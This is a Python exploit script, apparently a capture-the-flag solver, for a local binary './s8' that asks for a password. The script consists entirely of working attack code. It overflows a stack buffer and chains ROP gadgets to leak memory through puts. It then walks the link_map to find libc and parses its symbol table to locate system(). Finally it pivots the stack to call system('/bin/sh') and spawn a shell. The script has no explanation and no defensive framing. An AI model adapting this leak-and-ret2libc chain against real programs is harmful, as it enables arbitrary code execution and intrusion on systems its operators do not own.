#!/usr/bin/python3

import struct  
import binascii
import time
import sys
import json
import binexpect


class LibcMap:

    libc_map = {}
    last_scanned_offset = 0

    def put(self, symbol, address, scanned_offset):
        if address != 0:
            self.libc_map[str(symbol,'utf-8')] = address
        self.last_scanned_offset = scanned_offset

    def get(self, symbol):
        if symbol in self.libc_map:
            return self.libc_map[symbol]

        return None


def rop(*args):  
        return struct.pack('Q'*len(args), *args)



libc_map = LibcMap()

setup = binexpect.setup("./s8")
s7 = setup.target()
s7.setecho(False)

s7.tryexpect("Welcome Stranger")
s7.tryexpect("What is your password\?")

def leak(address):
    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601800, # frame pointer
        0x00400630, # read@main
        )    

    s7.sendbin(payload)
    
    payload = rop(
        0x00400703, # pop rdi; ret;
        address,    # leak
        0x004004c0, # puts@plt
        0x00400520, # entry point again
        0x00601800-0x28, # new RSP 
        0x00400691, # leave; ret;
        )
    

    s7.sendbin(payload)

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601718, # frame pointer (somewhere harmless)
        0x00400630, # read@main
        )    

    s7.sendbinline(payload)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "If you're cool you'll get a shell.\n"
                 "(.*)\n"
                 "Welcome Stranger\n"
                 "What is your password\?\n"
                 "If you're cool you'll get a shell.\n"
                 "If you're cool you'll get a shell.\n"
                 "Welcome Stranger\n"
                 "What is your password\?\n",
                  exitwithprogram=False
                 )

    if s7.match != None:
        result = s7.match.group(1)
    else:
        result = ""

    if not s7.isalive():
        print("died leaking address: " + hex(address))
        raise 

    return result


def upack(s):
    ss = s[:8]
    pad = bytes('\x00' * (8-len(ss)), 'utf-8')
    return struct.unpack('Q', ss + pad)[0]

def upleak(address):

    r = upack(leak(address))

    sh = 1

    while r == 0 and sh < 8:
        r = (upack(leak(address+sh)) << (sh*8)) & 0xffffffffffffffff
        sh += 1
        
    return r

def upleak_safe(address):
    result = 0

    for i in range(8):
        piece = upleak1(address+i)
        result = result | (piece << (i*8))

    return result

def upleak_safe_32(address):
    result = 0

    for i in range(4):
        piece = upleak1(address+i)
        result = result | (piece << (i*8))

    return result


def upleak1(address):

    r = upack(leak(address)[:1])
        
    return r

def upack32(s):
    ss = s[:4]
    pad = b'\x00' * (4-len(ss))
    return struct.unpack('I', ss + pad)[0]

def get_bytes(start, size):

    bs = []

    for i in range(start, start+size):
        bs.append(upleak1(i))

    return bs

def get_link_map(got_plt):
    r = upack(leak(got_plt+8))

    return r


def get_str_symtab(dynamic):
    strtab = 0
    symtab = 0
    i = 0

    while (strtab == 0 or symtab == 0):
        typ = upack(leak(dynamic + i))
        


        if typ == 5:
            strtab = upleak(dynamic + i + 8)
        elif typ == 6:
            symtab = upleak(dynamic + i + 8)

        i += 16

    return (strtab, symtab)

def get_symbol(symbol, strtab, symtab, libc_map):
    i = libc_map.last_scanned_offset

    while True:

        offset = upack32(leak(symtab+i))

        if offset != 0:
            sym = leak(strtab+offset)

            sym_addr = upleak_safe(symtab + i + 8)

            libc_map.put(sym, sym_addr, i)

            if sym == symbol:
                return sym_addr


        i += 24

def get_libc(link_map):

    base = upleak(link_map)
    name = leak(upack(leak(link_map+8)))
    dynamic = upleak(link_map+16)
    nextp = upleak(link_map+24)

    if name.find(bytes('libc', 'utf-8')) >= 0:
        return (base, dynamic)
        
    if nextp != 0:
        return get_libc(nextp)


def execute_shell(system_addr):

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601800, # frame pointer
        0x00400630, # read@main
        )    

    s7.sendbin(payload)
    
    payload = rop(
        0x00400703, # pop rdi; ret;
        0x00601800-8,    # "/bin/sh" address
        system_addr, 
        0x0068732F6E69622F, # "/bin/sh" string itself
        0x00601800-0x28, # new RSP 
        0x00400691, # leave; ret;
        )
    

    s7.sendbin(payload)

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601718, # frame pointer
        0x00400630, # read@main
        )    

    s7.sendbinline(payload)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "If you're cool you'll get a shell.\n" )


    return;



counter = 0

while True:

    base = 0x00400000
    test = leak(base)

    if counter == 0 and test.startswith(bytes("\x7fELF", 'utf-8')):
        print( "Leak works!")

    got_plt = 0x00601000

    if counter == 0:
        print("parsing link_map...")
    link_map = get_link_map(got_plt)

    if counter == 0:
        print ("link_map found at " + hex(link_map))
        print ("searching for libc...")

    libc_base, libc_dynamic = get_libc(link_map)

    libc_map.base = libc_base

    system = libc_map.get("system")
    lldiv = libc_map.get("lldiv")

    if counter == 0:
        print("searching for system()...")

    if system == None:

        strtab, symtab = get_str_symtab(libc_dynamic)

        if counter == 0:
            print ("strtab " + hex(strtab))
            print ("symtab " + hex(symtab))

        if system == None:
            system = get_symbol(b"system", strtab, symtab, libc_map)
        
                    
    print("...found system at: " + hex(system+ libc_base))
    
    execute_shell(system + libc_base)


    s7.pwned()

    break
    


